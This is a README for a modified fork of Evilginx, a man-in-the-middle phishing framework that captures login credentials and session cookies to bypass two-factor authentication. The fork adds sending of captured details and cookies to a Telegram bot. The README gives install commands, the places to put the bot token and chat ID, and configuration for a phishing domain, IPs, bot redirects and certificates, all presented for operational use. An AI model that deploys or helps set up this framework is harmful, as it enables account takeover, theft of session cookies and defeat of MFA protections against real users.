<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

# Latest Evilginx 3.4.2 - Modified by @zn0m + telegram sending captured details + cookies



#THANKS !


**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.


How to install ?

On Ubuntu:
FRIST OF ALL MODIFY core/session.go
const (
	telegramBotToken = "" // Replace with your bot token from BotFather
	telegramChatID = ""   // Replace with your chat ID with Get my Chat ID invite it to your groups
)

1. sudo apt update sudo apt install git make gcc libpcap-dev -y wget https://go.dev/dl/go1.19.linux-amd64.tar.gz sudo tar -C /usr/local -xzf go1.19.linux-amd64.tar.gz export PATH=$PATH:/usr/local/go/bin source ~/.profile go version
2. sudo ufw allow 53 sudo ufw allow 80 sudo ufw allow 443 sudo ufw reload sudo systemctl stop systemd-resolved sudo systemctl disable systemd-resolved
3. sudo nano /etc/resolv.conf
remove old ns add these:
  nameserver 8.8.8.8
  nameserver 8.8.4.4
4. git clone https://github.com/zn0m/evgnx2.git
5. cd evgnx2
6.make
7. sudo ./build/evilginx -p ./phishlets -t ./redirectors 127.0.0.1:35800 -developer

Setup your configuration.

1. config domain something.com
2. cofig ipv4 external serverip
3. config ipv4 bind serverip
4. config unauth_url https://bots.here.redirected.com/
5. config autocert off/on

[ if ON free certificates is used, it can rate-limit your domain if u ask too much. ]
[ If OFF 
- Feature: Added support to load custom TLS certificates from a public certificate file and a private key file stored in `~/.evilginx/crt/sites/<hostname>/`. Will load `fullchain.pem` and `privkey.pem` pair or a combination of a `.pem`/`.crt` (public certificate) and a `.key` (private key) file. Make sure to run without `-developer` flag and disable autocert retrieval with `config autocert off`.
}




Add to your Telegram group https://t.me/raw_data_bot and your Group Chat ID will be displayed.



## Help

In case you want to learn how to install and use **Evilginx**, please refer to online documentation available at:

https://help.evilginx.com


This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, but i did modification in 2024.04.02 which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
